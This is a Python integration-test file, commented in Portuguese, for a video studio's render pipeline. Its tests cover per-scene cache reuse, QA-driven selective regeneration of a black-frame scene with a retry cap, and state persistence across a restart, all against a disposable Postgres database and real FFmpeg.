"""Testes de Integração de Pipeline (REC-03.03 / R10).

Cobre integralmente os requisitos de recuperação com provas reais (Postgres descartável + FFmpeg real):
 (a) alteração de UMA cena preserva segmentos de vídeo E narração/TTS em cache das cenas não afetadas
     (chaves/hashes/mtime iguais, contadores reais de chamadas FFmpeg e TTS, cena 0 com hash novo)
     + preflight, progresso por shot e cancelamento cooperativo (REC-03.03b);
 (b) defeito conhecido (frame preto real via FFmpeg blackdetect) detectado pelo QA dispara
     `compute_selective_regeneration` dentro do `QaHandler`/`ProductionCoordinator` reais,
     regenera seletivamente apenas a cena defeituosa reaproveitando cache das demais, reavalia QA
     e falha fechado com estado persistido no Postgres ao esgotar `max_attempts`;
 (c) estado, identidade congelada (`EffectiveConfig`), legendas, `ProductionCoordinator` e cache
     do `PlanFfmpegRenderer` sobrevivem a restart (novas conexões/instâncias lendo Postgres);
 (d) Creative Direction sanitização (bloqueia injeções CLI/shell sem falsos positivos em PT-BR),
     Brief -> GenerateScript / GenerateLongScript / RunRender -> RenderPlan (identidade congelada
     preservada), rotas `/subtitles`, `/subtitles.vtt`, `/subtitles.ass` via `export_captions_from_plan`
     com fallback legado, `render.caption_sync` fail-closed + resistente a mutação, e licença
     fail-closed (sem bypass por substring, sem nomes de vendor no domínio) em `Approve`,
     `ClaimPublication`, `RunPublication` e `publication_block_reason` (incluindo `scene_assets`
     e assets ausentes, preservando kill switch `enabled=False`).
"""
from __future__ import annotations

import hashlib
import math
import os
import re
import shutil
import struct
import subprocess
import uuid
import wave
from datetime import datetime, timezone
from pathlib import Path

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from PIL import Image

from app.studio.adapters.captions_exporters import export_captions_from_plan
from app.studio.adapters.license_mapping import normalize_vendor_license
from app.studio.adapters.postgres.db import migrate
from app.studio.adapters.postgres.editorial_repo import (
    PostgresScriptRepository,
    PostgresSnapshotRepository,
    PostgresUsageRepository,
)
from app.studio.adapters.postgres.media_repo import PostgresAssetRepository
from app.studio.adapters.postgres.production_repo import build_postgres_production_run_repository
from app.studio.adapters.postgres.publish_repo import (
    PostgresApprovalRepository,
    PostgresPublicationIntentRepository,
    PostgresPublicationRepository,
)
from app.studio.adapters.postgres.render_plan_repo import PostgresRenderPlanRepository
from app.studio.adapters.postgres.render_repo import PostgresRenderJobRepository
from app.studio.adapters.postgres.repo import PostgresVideoRepository
from app.studio.adapters.quality_ffmpeg import FfmpegQualityEvaluator, _probe_duration
from app.studio.adapters.render_plan_ffmpeg import PlanFfmpegRenderer, RenderCancelledError, _run as _ffmpeg_run
from app.studio.adapters.storage import FileAssetStore, FileRenderStorage
from app.studio.api.routes import make_router
from app.studio.application.editorial import CostGuard, GenerateScript, StateConflict
from app.studio.application.longform import GenerateLongScript
from app.studio.application.ports import RenderSpec, SceneDraft, TextModel, TextResult
from app.studio.application.production import (
    ProductionCoordinator,
    ProductionMode,
    ProductionStage,
    QaHandler,
    RenderHandler,
    WorkerStepResult,
)
from app.studio.application.publication_execution import PublicationResult, RunPublication
from app.studio.application.publication_gate import license_block_reason, publication_block_reason
from app.studio.application.publishing import Approve, ClaimPublication
from app.studio.application.render import RunRender, StartRender, config_snapshot_for
from app.studio.composition.settings import Settings
from app.studio.composition.wiring import Studio
from app.studio.domain.asset_registry import verify_license_provenance
from app.studio.domain.contracts import (
    Asset,
    AssetKind,
    JobStatus,
    Publication,
    PublicationStatus,
    Scene as StoryboardRow,
    SceneAsset,
    UsageEntry,
    Video,
    VideoFormat,
    VideoStatus,
)
from app.studio.domain.effective_config import resolve_effective_config
from app.studio.domain.production_run import CreateRunResult, RunState, StageDag, StageState
from app.studio.domain.qa_report import QaCoverage, QaReport
from app.studio.domain.quality import CHECK_CAPTION_SYNC, QualityEvidence, evaluate_quality
from app.studio.domain.render_cache import NodeId
from app.studio.domain.render_engine import RenderProgress, RenderProgressStage
from app.studio.domain.render_plan import AssetReference
from app.studio.domain.render_plan_builder import StoryboardScene, build_render_plan
from conftest import verified_test_connect

PROJECT_ID = "a" * 32
VIDEO_ID = "1" * 32
VIDEO_ID_2 = "9" * 32
SCENE_0_ID = "0" * 32
SCENE_1_ID = "2" * 32
SCENE_2_ID = "3" * 32
AST_0_ID = "4" * 32
AST_1_ID = "5" * 32
AST_2_ID = "6" * 32
AST_0_V2_ID = "7" * 32
AST_OVERLAY_BAD_ID = "8" * 32

AUTH_USER = "test-user"
AUTH_PASS = "test-browser-password"
WORKER_TOKEN = "test-worker-token"

needs_ffmpeg = pytest.mark.skipif(
    shutil.which("ffmpeg") is None or shutil.which("ffprobe") is None,
    reason="ffmpeg/ffprobe required for real pipeline tests",
)


@pytest.fixture
def dsn():
    val = os.environ.get("STUDIO_BUDGET_DISPOSABLE_DSN")
    if not val or not os.environ.get("STUDIO_BUDGET_TEST_PROOF_FILE"):
        pytest.skip("PostgreSQL descartável não configurado")
    return val


@pytest.fixture
def conn(dsn):
    proof = os.environ["STUDIO_BUDGET_TEST_PROOF_FILE"]
    c = verified_test_connect(dsn, proof)
    try:
        c.execute("DROP SCHEMA IF EXISTS studio CASCADE")
        c.commit()
        yield c
    finally:
        c.close()


def _tone_wav(path: Path, seconds: float = 1.2, rate: int = 22050, freq: float = 260.0) -> float:
    path.parent.mkdir(parents=True, exist_ok=True)
    with wave.open(str(path), "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(rate)
        n = round(seconds * rate)
        w.writeframes(
            b"".join(
                struct.pack("<h", int(32767 * 0.4 * math.sin(2 * math.pi * freq * i / rate)))
                for i in range(n)
            )
        )
    return n / rate


def _png_bytes(color: tuple[int, int, int] = (60, 100, 180), size: tuple[int, int] = (720, 1280)) -> bytes:
    import io
    buf = io.BytesIO()
    Image.new("RGB", size, color).save(buf, format="PNG")
    return buf.getvalue()


def _png_file(path: Path, color: tuple[int, int, int] = (60, 100, 180), size: tuple[int, int] = (720, 1280)) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(_png_bytes(color=color, size=size))
    return path


class _CountingToneVoice:
    name = "tone"
    model = "local-tone-v1"

    def __init__(self, seconds: float = 1.4, seconds_by_text: dict[str, float] | None = None):
        self.seconds = seconds
        self.seconds_by_text = dict(seconds_by_text or {})
        self.calls: list[str] = []

    def speak(self, text: str, out_path: Path) -> float:
        self.calls.append(text)
        dur = self.seconds_by_text.get(text, self.seconds)
        return _tone_wav(Path(out_path), seconds=dur)


def _seed_project_and_video(conn, *, project_id: str = PROJECT_ID, video_id: str = VIDEO_ID,
                            topic: str = "Tópico de Teste", fmt: str = "short", status: str = "IDEA") -> None:
    conn.execute(
        "INSERT INTO studio.projects(id, name) VALUES (%s, 'Canal Teste') ON CONFLICT (id) DO NOTHING",
        (project_id,),
    )
    conn.execute(
        "INSERT INTO studio.videos(id, project_id, topic, format, status) VALUES (%s, %s, %s, %s, %s)",
        (video_id, project_id, topic, fmt, status),
    )
    conn.commit()


def _ck(label: str) -> str:
    return hashlib.sha256(label.encode("utf-8")).hexdigest()


def _seed_scenes_with_assets(
    *,
    conn,
    script_repo: PostgresScriptRepository,
    asset_repo: PostgresAssetRepository,
    asset_store: FileAssetStore,
    video_id: str,
    scene_specs: list[tuple[str, str, tuple[int, int, int]]],
) -> list[StoryboardRow]:
    """Cria cenas usando `SceneDraft` canônico e associa imagens reais via `PostgresAssetRepository`."""
    drafts = [
        SceneDraft(
            narration=narration,
            caption=narration[:60],
            label=label,
            image_prompt=f"Cena ilustrativa sobre {label} com boa iluminação",
            claim_ids=["c1"],
        )
        for narration, label, _ in scene_specs
    ]
    script_repo.save_and_advance(
        video_id,
        "\n".join(d.narration for d in drafts),
        drafts,
        ["c1"],
        VideoStatus.IDEA,
        VideoStatus.SCRIPTED,
    )
    scenes = script_repo.scenes(video_id)
    for sc, (_, label, color) in zip(scenes, scene_specs):
        raw = _png_bytes(color=color)
        key = _ck(f"img-{video_id}-{sc.id}-{color[0]}-{color[1]}-{color[2]}")
        rel = asset_store.put(key, raw, "9:16")
        asset = asset_repo.add(Asset(
            id=uuid.uuid4().hex,
            kind=AssetKind.image,
            cache_key=key,
            path=rel,
            provider="placeholder",
            model="local",
            license="CC0-1.0 (gerada localmente pelo estúdio)",
            attribution=f"Estúdio {label}",
        ))
        assert asset_repo.swap_scene_asset(video_id, sc.id, asset.id, sc.asset_id)
    conn.execute("UPDATE studio.videos SET status = 'ASSETS_READY' WHERE id = %s", (video_id,))
    conn.commit()
    return script_repo.scenes(video_id)


# ==============================================================================
# (a) Cache Segmentado (Vídeo + Narração/TTS) + Preflight / Progresso / Cancelamento
# ==============================================================================

@needs_ffmpeg
def test_pipeline_single_scene_change_reuses_unaffected_segments_and_narration(conn, dsn, tmp_path):
    """(a) + REC-03.03b: Mudar 1 cena reusa segmentos de vídeo E narração/TTS das cenas 1 e 2."""
    migrate(conn)
    proof = os.environ["STUDIO_BUDGET_TEST_PROOF_FILE"]
    c_connect = lambda: verified_test_connect(dsn, proof)  # noqa: E731

    _seed_project_and_video(conn, video_id=VIDEO_ID, topic="Cache Segmentado", status="IDEA")
    video_repo = PostgresVideoRepository(c_connect)
    script_repo = PostgresScriptRepository(c_connect)
    asset_repo = PostgresAssetRepository(c_connect)
    job_repo = PostgresRenderJobRepository(c_connect)
    plan_repo = PostgresRenderPlanRepository(c_connect)
    storage_root = tmp_path / "storage"
    asset_store = FileAssetStore(storage_root)
    render_files = FileRenderStorage(storage_root)
    cache_dir = storage_root / "render-cache"

    scenes = _seed_scenes_with_assets(
        conn=conn,
        script_repo=script_repo,
        asset_repo=asset_repo,
        asset_store=asset_store,
        video_id=VIDEO_ID,
        scene_specs=[
            ("Narração inicial da cena zero.", "C0", (200, 50, 50)),
            ("Narração estável da cena um.", "C1", (50, 200, 50)),
            ("Narração estável da cena dois.", "C2", (50, 50, 200)),
        ],
    )
    sc0, sc1, sc2 = scenes

    ffmpeg_calls: list[list[str]] = []

    def counting_runner(cmd: list[str], timeout: int = 600) -> None:
        ffmpeg_calls.append(list(cmd))
        _ffmpeg_run(cmd, timeout)

    voice = _CountingToneVoice(seconds=1.4)
    renderer = PlanFfmpegRenderer(plans=plan_repo, cache_root=cache_dir, runner=counting_runner)
    start_render = StartRender(video_repo, script_repo, asset_repo, job_repo, enqueue=lambda _jid: None)
    run_render = RunRender(
        video_repo, script_repo, asset_repo, job_repo, render_files,
        voice_for=lambda _v: voice,
        renderer_for=lambda _pid: renderer,
        quality=FfmpegQualityEvaluator(),
        plans=plan_repo,
        narration_reuse=True,
    )

    # Revisão 1: renderiza todas as 3 cenas (3 chamadas TTS + 3 visual shots + concat + audio = 5 FFmpeg)
    job1 = start_render.execute(VIDEO_ID)
    run_render.execute(job1.id)
    finished1 = job_repo.get(job1.id)
    assert finished1 is not None and finished1.status is JobStatus.SUCCEEDED
    assert len(voice.calls) == 3
    assert len(ffmpeg_calls) == 5  # 3 shots + 1 concat + 1 final audio mix

    entries_1 = plan_repo.entries(f"plan:{VIDEO_ID}")
    sc0_vis_before = entries_1[NodeId("visual", f"shot:{sc0.id}")]
    sc1_vis_before = entries_1[NodeId("visual", f"shot:{sc1.id}")]
    sc2_vis_before = entries_1[NodeId("visual", f"shot:{sc2.id}")]
    sc1_nar_before = entries_1[NodeId("narration", sc1.id)]
    sc2_nar_before = entries_1[NodeId("narration", sc2.id)]
    sc1_path = Path(sc1_vis_before.artifact_uri)
    sc2_path = Path(sc2_vis_before.artifact_uri)
    mtime_1_before = sc1_path.stat().st_mtime_ns
    mtime_2_before = sc2_path.stat().st_mtime_ns

    # Modifica APENAS a cena 0 (nova imagem + nova narração); retorna vídeo para RENDERED para novo render
    raw_v2 = _png_bytes(color=(250, 220, 40))
    key_v2 = _ck("img-scene0-v2")
    rel_v2 = asset_store.put(key_v2, raw_v2, "9:16")
    asset_v2 = asset_repo.add(Asset(
        id=uuid.uuid4().hex,
        kind=AssetKind.image,
        cache_key=key_v2,
        path=rel_v2,
        provider="placeholder",
        model="local",
        license="CC0-1.0 (gerada localmente pelo estúdio)",
        attribution="Estúdio C0 v2",
    ))
    assert asset_repo.swap_scene_asset(VIDEO_ID, sc0.id, asset_v2.id, sc0.asset_id)
    conn.execute(
        "UPDATE studio.scenes SET narration = %s WHERE id = %s",
        ("Narração modificada exclusivamente na cena zero.", sc0.id),
    )
    conn.execute("UPDATE studio.videos SET status = 'RENDERED' WHERE id = %s", (VIDEO_ID,))
    conn.commit()

    # Revisão 2: TTS chamado SOMENTE 1x (cena 0); FFmpeg chamado SOMENTE 3x (1 shot + concat + audio)
    voice.calls.clear()
    ffmpeg_calls.clear()
    job2 = start_render.execute(VIDEO_ID)
    run_render.execute(job2.id)
    finished2 = job_repo.get(job2.id)
    assert finished2 is not None and finished2.status is JobStatus.SUCCEEDED
    assert len(voice.calls) == 1, f"TTS deveria rodar apenas para cena 0, rodou {len(voice.calls)}x"
    assert voice.calls[0] == "Narração modificada exclusivamente na cena zero."
    assert len(ffmpeg_calls) == 3, (
        f"FFmpeg deveria rodar 1 shot + concat + audio (3x), rodou {len(ffmpeg_calls)}x: "
        f"{[c[-1] for c in ffmpeg_calls]}"
    )

    entries_2 = plan_repo.entries(f"plan:{VIDEO_ID}")
    sc0_vis_after = entries_2[NodeId("visual", f"shot:{sc0.id}")]
    sc1_vis_after = entries_2[NodeId("visual", f"shot:{sc1.id}")]
    sc2_vis_after = entries_2[NodeId("visual", f"shot:{sc2.id}")]
    sc1_nar_after = entries_2[NodeId("narration", sc1.id)]
    sc2_nar_after = entries_2[NodeId("narration", sc2.id)]

    # Cena 0 mudou efetivamente de fingerprint e hash
    assert sc0_vis_after.fingerprint != sc0_vis_before.fingerprint
    assert sc0_vis_after.artifact_sha256 != sc0_vis_before.artifact_sha256

    # Cenas 1 e 2 mantiveram artefatos visuais e de narração intactos sem re-render
    assert sc1_vis_after.artifact_sha256 == sc1_vis_before.artifact_sha256
    assert sc2_vis_after.artifact_sha256 == sc2_vis_before.artifact_sha256
    assert sc1_vis_after.artifact_uri == sc1_vis_before.artifact_uri
    assert sc2_vis_after.artifact_uri == sc2_vis_before.artifact_uri
    assert sc1_nar_after.artifact_sha256 == sc1_nar_before.artifact_sha256
    assert sc2_nar_after.artifact_sha256 == sc2_nar_before.artifact_sha256
    assert sc1_path.stat().st_mtime_ns == mtime_1_before
    assert sc2_path.stat().st_mtime_ns == mtime_2_before


@needs_ffmpeg
def test_pipeline_rec03_03b_preflight_progress_and_cooperative_cancel(tmp_path):
    """REC-03.03b: Progresso por shot, cancelamento cooperativo entre shots e preflight real."""
    img0 = _png_file(tmp_path / "img0.png", (200, 80, 80))
    img1 = _png_file(tmp_path / "img1.png", (80, 200, 80))
    wav0 = tmp_path / "w0.wav"
    wav1 = tmp_path / "w1.wav"
    _tone_wav(wav0, 1.0)
    _tone_wav(wav1, 1.0)
    rows = [
        StoryboardRow(id=SCENE_0_ID, video_id=VIDEO_ID, idx=0, narration="Cena zero.", label="C0",
                      caption="C0", image_prompt="Prompt zero detalhado", asset_id=AST_0_ID),
        StoryboardRow(id=SCENE_1_ID, video_id=VIDEO_ID, idx=1, narration="Cena um.", label="C1",
                      caption="C1", image_prompt="Prompt um detalhado", asset_id=AST_1_ID),
    ]

    # 1. Progresso granular completo em execução bem-sucedida
    events: list[RenderProgress] = []
    renderer = PlanFfmpegRenderer()
    spec_ok = RenderSpec(
        scenes=rows,
        images=[img0, img1],
        speech_wavs=[wav0, wav1],
        scene_seconds=[1.8, 1.8],
        cues=[],
        format=VideoFormat.short,
        music=False,
        work_dir=tmp_path / "work_ok",
        on_progress=events.append,
    )
    out_ok = renderer.render(spec_ok, tmp_path / "ok.mp4")
    assert out_ok.is_file()
    stages = [e.stage for e in events]
    assert RenderProgressStage.PREFLIGHT in stages
    assert stages.count(RenderProgressStage.RENDERING_SEGMENTS) == 2
    assert RenderProgressStage.CONCATENATING in stages
    assert RenderProgressStage.MIXING_AUDIO in stages
    assert stages[-1] == RenderProgressStage.COMPLETED

    # 2. Cancelamento cooperativo após shot 0 impede execução do shot 1
    cancel_events: list[RenderProgress] = []
    shots_executed: list[int] = []

    def _cancel_after_first() -> bool:
        return len(shots_executed) >= 1

    def _tracking_runner(cmd: list[str], timeout: int = 600) -> None:
        shots_executed.append(1)
        _ffmpeg_run(cmd, timeout)

    cancelling_renderer = PlanFfmpegRenderer(runner=_tracking_runner)
    spec_cancel = RenderSpec(
        scenes=rows,
        images=[img0, img1],
        speech_wavs=[wav0, wav1],
        scene_seconds=[1.8, 1.8],
        cues=[],
        format=VideoFormat.short,
        music=False,
        work_dir=tmp_path / "work_cancel",
        cancel_check=_cancel_after_first,
        on_progress=cancel_events.append,
    )
    with pytest.raises(RenderCancelledError):
        cancelling_renderer.render(spec_cancel, tmp_path / "cancelled.mp4")
    assert len(shots_executed) == 1, "Cancelamento cooperativo deveria interromper antes do shot 1"
    assert cancel_events[-1].stage == RenderProgressStage.CANCELLED


# ==============================================================================
# (b) QA Real + Regeneração Seletiva Limitada no ProductionCoordinator/QaHandler
# ==============================================================================

@needs_ffmpeg
def test_pipeline_qa_known_defect_triggers_bounded_selective_regeneration(conn, dsn, tmp_path):
    """(b) Defeito real (cena 0 preta) -> QaHandler/ProductionCoordinator regenera seletivamente
    com reuso de cache das cenas intactas, reavalia QA e falha fechado no teto `max_attempts`."""
    migrate(conn)
    proof = os.environ["STUDIO_BUDGET_TEST_PROOF_FILE"]
    c_connect = lambda: verified_test_connect(dsn, proof)  # noqa: E731

    video_repo = PostgresVideoRepository(c_connect)
    script_repo = PostgresScriptRepository(c_connect)
    asset_repo = PostgresAssetRepository(c_connect)
    job_repo = PostgresRenderJobRepository(c_connect)
    plan_repo = PostgresRenderPlanRepository(c_connect)
    usage_repo = PostgresUsageRepository(c_connect)
    render_qa_dag = StageDag({
        ProductionStage.RENDER: (),
        ProductionStage.QA: (ProductionStage.RENDER,),
    })
    run_repo = build_postgres_production_run_repository(c_connect, dag=render_qa_dag)
    storage_root = tmp_path / "storage"
    asset_store = FileAssetStore(storage_root)
    render_files = FileRenderStorage(storage_root)
    cache_dir = storage_root / "render-cache"

    # --- SUB-TESTE 1: Defeito na cena 0 (preta) é corrigido seletivamente na tentativa 1 ---
    _seed_project_and_video(conn, video_id=VIDEO_ID, topic="QA Seletivo Recuperável", status="IDEA")
    scenes = _seed_scenes_with_assets(
        conn=conn,
        script_repo=script_repo,
        asset_repo=asset_repo,
        asset_store=asset_store,
        video_id=VIDEO_ID,
        scene_specs=[
            ("Preto.", "", (0, 0, 0)),                                         # DEFEITO: cena longa preta (>30% black_ratio real)
            ("Cena um saudável e colorida.", "C1", (40, 170, 90)),
            ("Cena dois saudável e vibrante.", "C2", (40, 90, 210)),
        ],
    )
    sc0, sc1, sc2 = scenes

    repaired_scenes_log: list[tuple[int, tuple[str, ...]]] = []

    def repair_black_scene(vid: str, regen_plan, _ctx) -> bool:
        repaired_scenes_log.append((regen_plan.attempt_number, regen_plan.defective_scene_ids))
        targets = regen_plan.defective_scene_ids
        assert targets == (sc0.id,), f"Esperava apenas sc0 defeituosa, recebeu {targets}"
        current_by_id = {s.id: s.asset_id for s in script_repo.scenes(vid)}
        for target_id in targets:
            clean_bytes = _png_bytes(color=(210, 140, 40))
            key = _ck(f"repaired-{target_id}-{regen_plan.attempt_number}")
            rel = asset_store.put(key, clean_bytes, "9:16")
            new_asset = asset_repo.add(Asset(
                id=uuid.uuid4().hex,
                kind=AssetKind.image,
                cache_key=key,
                path=rel,
                provider="placeholder",
                model="local-repair",
                license="CC0-1.0 (gerada localmente pelo estúdio)",
                attribution="Estúdio Reparo",
            ))
            assert asset_repo.swap_scene_asset(vid, target_id, new_asset.id, current_by_id.get(target_id))
        return True

    voice = _CountingToneVoice(seconds=1.2, seconds_by_text={"Preto.": 4.0})
    renderer = PlanFfmpegRenderer(plans=plan_repo, cache_root=cache_dir)
    start_render = StartRender(video_repo, script_repo, asset_repo, job_repo, enqueue=lambda _jid: None)
    run_render = RunRender(
        video_repo, script_repo, asset_repo, job_repo, render_files,
        voice_for=lambda _v: voice,
        renderer_for=lambda _pid: renderer,
        quality=FfmpegQualityEvaluator(),
        plans=plan_repo,
        narration_reuse=True,
    )

    handlers = {
        ProductionStage.RENDER: RenderHandler(start_render, run_render, job_repo),
        ProductionStage.QA: QaHandler(
            video_repo, job_repo,
            plans=plan_repo,
            start_render=start_render,
            run_render=run_render,
            scene_repair=repair_black_scene,
            max_regeneration_attempts=3,
        ),
    }
    coordinator = ProductionCoordinator(
        run_repo,
        handlers=handlers,
        mode=ProductionMode.BUDGET_GUARDED,
        pipeline=render_qa_dag,
        videos=video_repo,
        config_store=run_repo,
    )
    creation = coordinator.start(
        VIDEO_ID,
        "qa-selective-recovery-1",
        stages=(ProductionStage.RENDER, ProductionStage.QA),
    )

    # Passo 1: RENDER produz vídeo com cena 0 preta -> QA inicial REPROVA (`black_frames`)
    step_render = coordinator.step(creation.run.run_id, owner="worker-qa")
    assert step_render.result is WorkerStepResult.COMPLETED
    v_after_render = video_repo.get_video(VIDEO_ID)
    assert v_after_render is not None
    assert v_after_render.status is VideoStatus.RENDERED  # NÃO avançou para AWAITING_APPROVAL
    assert v_after_render.qa_report is not None and v_after_render.qa_report.is_publishable is False
    assert any(f.check_id == "render.black_frames" and f.scene_id == sc0.id for f in v_after_render.qa_report.blocking_findings)

    entries_before_regen = plan_repo.entries(f"plan:{VIDEO_ID}")
    sc1_sha_before = entries_before_regen[NodeId("visual", f"shot:{sc1.id}")].artifact_sha256
    sc2_sha_before = entries_before_regen[NodeId("visual", f"shot:{sc2.id}")].artifact_sha256
    voice.calls.clear()

    # Passo 2: QA detecta defeito na cena 0 -> regenera seletivamente cena 0 -> reavalia -> APROVA!
    step_qa = coordinator.step(creation.run.run_id, owner="worker-qa")
    assert step_qa.result is WorkerStepResult.COMPLETED, f"QA falhou: {step_qa.detail}"
    assert repaired_scenes_log == [(1, (sc0.id,))]
    assert len(voice.calls) == 0, "Narração inalterada das 3 cenas deve ser reusada do cache"

    v_after_qa = video_repo.get_video(VIDEO_ID)
    assert v_after_qa is not None and v_after_qa.status is VideoStatus.AWAITING_APPROVAL
    assert v_after_qa.qa_report is not None and v_after_qa.qa_report.is_publishable is True

    # Cenas 1 e 2 tiveram segmentos visuais reaproveitados do cache
    entries_after_regen = plan_repo.entries(f"plan:{VIDEO_ID}")
    assert entries_after_regen[NodeId("visual", f"shot:{sc1.id}")].artifact_sha256 == sc1_sha_before
    assert entries_after_regen[NodeId("visual", f"shot:{sc2.id}")].artifact_sha256 == sc2_sha_before

    # Checkpoint da etapa QA persistido no Postgres registra a regeneração seletiva
    stages_db = {s.stage_id: s for s in run_repo.list_stages(creation.run.run_id)}
    assert stages_db[ProductionStage.QA].state is StageState.SUCCEEDED
    qa_ckpt = stages_db[ProductionStage.QA].checkpoint.payload
    assert qa_ckpt["qa_passed"] is True
    assert qa_ckpt["regeneration_attempts"] == 1
    assert qa_ckpt["regeneration_history"][0]["defective_scene_ids"] == [sc0.id]
    assert usage_repo.spent_video(VIDEO_ID) == 0.0

    # --- SUB-TESTE 2: Defeito persistente esgota max_attempts=2 -> falha fechada no Postgres ---
    _seed_project_and_video(conn, video_id=VIDEO_ID_2, topic="QA Teto Esgotado", status="IDEA")
    _seed_scenes_with_assets(
        conn=conn,
        script_repo=script_repo,
        asset_repo=asset_repo,
        asset_store=asset_store,
        video_id=VIDEO_ID_2,
        scene_specs=[
            ("Preto.", "", (0, 0, 0)),
            ("Cena um ok.", "C1", (50, 180, 90)),
            ("Cena dois ok.", "C2", (50, 90, 190)),
        ],
    )
    attempts_seen: list[int] = []

    def noop_repair(_vid: str, regen_plan, _ctx) -> bool:
        attempts_seen.append(regen_plan.attempt_number)
        return False  # não corrige o defeito propositalmente

    handlers_cap = {
        ProductionStage.RENDER: RenderHandler(start_render, run_render, job_repo),
        ProductionStage.QA: QaHandler(
            video_repo, job_repo,
            plans=plan_repo,
            start_render=start_render,
            run_render=run_render,
            scene_repair=noop_repair,
            max_regeneration_attempts=2,
        ),
    }
    coord_cap = ProductionCoordinator(
        run_repo,
        handlers=handlers_cap,
        mode=ProductionMode.BUDGET_GUARDED,
        pipeline=render_qa_dag,
        videos=video_repo,
        config_store=run_repo,
    )
    creation_cap = coord_cap.start(
        VIDEO_ID_2,
        "qa-selective-exhausted-1",
        stages=(ProductionStage.RENDER, ProductionStage.QA),
    )
    assert coord_cap.step(creation_cap.run.run_id, owner="worker-cap").result is WorkerStepResult.COMPLETED
    step_fail = coord_cap.step(creation_cap.run.run_id, owner="worker-cap")
    assert step_fail.result is WorkerStepResult.FAILED
    assert attempts_seen == [1]  # tentativa 1 regenera; tentativa 2 atinge teto max_attempts=2 -> para!
    assert "Teto máximo" in (step_fail.detail or "")
    assert "2/2" in (step_fail.detail or "")

    persisted_run = run_repo.get_run(creation_cap.run.run_id)
    assert persisted_run is not None and persisted_run.state is RunState.FAILED
    v2_after = video_repo.get_video(VIDEO_ID_2)
    assert v2_after is not None and v2_after.status is VideoStatus.RENDERED


# ==============================================================================
# (c) Restart: Estado, Identidade Congelada, Coordenador e Cache do Renderer
# ==============================================================================

@needs_ffmpeg
def test_pipeline_state_frozen_identity_captions_and_cache_survive_restart(conn, dsn, tmp_path):
    """(c) Processo 2 (novo ProductionCoordinator + novo PlanFfmpegRenderer + novas conexões)
    relê Postgres sem perda/duplicação e reusa cache de segmentos com 0 chamadas FFmpeg."""
    migrate(conn)
    proof = os.environ["STUDIO_BUDGET_TEST_PROOF_FILE"]
    cache_dir = tmp_path / "render_cache"
    storage_root = tmp_path / "storage"
    asset_store = FileAssetStore(storage_root)

    brief_data = {
        "schema_version": 1,
        "topic": "História da IA",
        "narrative_goal": "Apresentar evolução da IA",
        "hook": "Você sabia que a IA começou em 1956?",
        "content_structure": ["Origem", "Modernidade"],
        "tone": "Educativo",
        "pacing": "moderate",
        "visual_direction": "Estilo documental nítido",
        "recommended_media_types": ["image", "video"],
        "caption_strategy": "Palavra ativa destacada",
        "audio_guidance": "Trilha ambiente discreta",
    }

    # --- PROCESSO 1 ---
    c1_connect = lambda: verified_test_connect(dsn, proof)  # noqa: E731
    _seed_project_and_video(conn, video_id=VIDEO_ID, topic="História da IA", status="IDEA")
    video_repo_1 = PostgresVideoRepository(c1_connect)
    script_repo_1 = PostgresScriptRepository(c1_connect)
    asset_repo_1 = PostgresAssetRepository(c1_connect)
    plan_repo_1 = PostgresRenderPlanRepository(c1_connect)
    restart_dag = StageDag({ProductionStage.RENDER: ()})
    run_repo_1 = build_postgres_production_run_repository(c1_connect, dag=restart_dag)

    video_repo_1.update_video_creative_brief(VIDEO_ID, brief_data)
    scenes_1 = _seed_scenes_with_assets(
        conn=conn,
        script_repo=script_repo_1,
        asset_repo=asset_repo_1,
        asset_store=asset_store,
        video_id=VIDEO_ID,
        scene_specs=[
            ("Em 1956 nasceu a IA.", "C0", (60, 110, 190)),
            ("Hoje ela transforma o mundo.", "C1", (90, 170, 120)),
        ],
    )
    wav0 = tmp_path / "speech0.wav"
    wav1 = tmp_path / "speech1.wav"
    _tone_wav(wav0, 1.2)
    _tone_wav(wav1, 1.2)

    images_1 = [storage_root / asset_repo_1.get(sc.asset_id).path for sc in scenes_1]
    effective_cfg = resolve_effective_config(
        video=video_repo_1.get_video(VIDEO_ID),
    )

    dummy_handlers = {
        ProductionStage.RENDER: RenderHandler(None, None, None),  # type: ignore[arg-type]
    }
    coord_1 = ProductionCoordinator(
        run_repo_1,
        handlers=dummy_handlers,
        mode=ProductionMode.INTERACTIVE,
        pipeline=restart_dag,
        videos=video_repo_1,
        config_store=run_repo_1,
    )
    creation_1 = coord_1.start(
        VIDEO_ID,
        "restart-idemp-key-01",
        stages=(ProductionStage.RENDER,),
        effective_config_for=lambda _v: effective_cfg,
    )
    renderer_1 = PlanFfmpegRenderer(plans=plan_repo_1, cache_root=cache_dir)
    spec = RenderSpec(
        scenes=scenes_1,
        images=images_1,
        speech_wavs=[wav0, wav1],
        scene_seconds=[2.0, 2.0],
        cues=[],
        format=VideoFormat.short,
        music=False,
        work_dir=tmp_path / "work_p1",
        config_snapshot=config_snapshot_for(effective_cfg),
        creative_brief=brief_data,
    )
    out_p1 = renderer_1.render(spec, tmp_path / "p1_final.mp4")
    assert out_p1.is_file()

    # --- PROCESSO 2 (RESTART: novas instâncias e conexões) ---
    c2_connect = lambda: verified_test_connect(dsn, proof)  # noqa: E731
    video_repo_2 = PostgresVideoRepository(c2_connect)
    script_repo_2 = PostgresScriptRepository(c2_connect)
    plan_repo_2 = PostgresRenderPlanRepository(c2_connect)
    run_repo_2 = build_postgres_production_run_repository(c2_connect, dag=restart_dag)

    video_reloaded = video_repo_2.get_video(VIDEO_ID)
    assert video_reloaded is not None and video_reloaded.creative_brief == brief_data

    scenes_reloaded = script_repo_2.scenes(VIDEO_ID)
    assert len(scenes_reloaded) == 2
    assert [s.caption for s in scenes_reloaded] == ["Em 1956 nasceu a IA.", "Hoje ela transforma o mundo."]

    coord_2 = ProductionCoordinator(
        run_repo_2,
        handlers=dummy_handlers,
        mode=ProductionMode.INTERACTIVE,
        pipeline=restart_dag,
        videos=video_repo_2,
        config_store=run_repo_2,
    )
    proj = coord_2.get(creation_1.run.run_id)
    assert proj is not None
    assert proj.config_hash == effective_cfg.content_hash
    stored_cfg = coord_2.config_for(creation_1.run.run_id)
    assert stored_cfg is not None and stored_cfg.content_hash == effective_cfg.content_hash

    # Idempotência do coordenador após restart: mesma chave devolve EXISTING sem duplicar run
    dup = coord_2.start(
        VIDEO_ID,
        "restart-idemp-key-01",
        stages=(ProductionStage.RENDER,),
        effective_config_for=lambda _v: effective_cfg,
    )
    assert dup.result is CreateRunResult.EXISTING
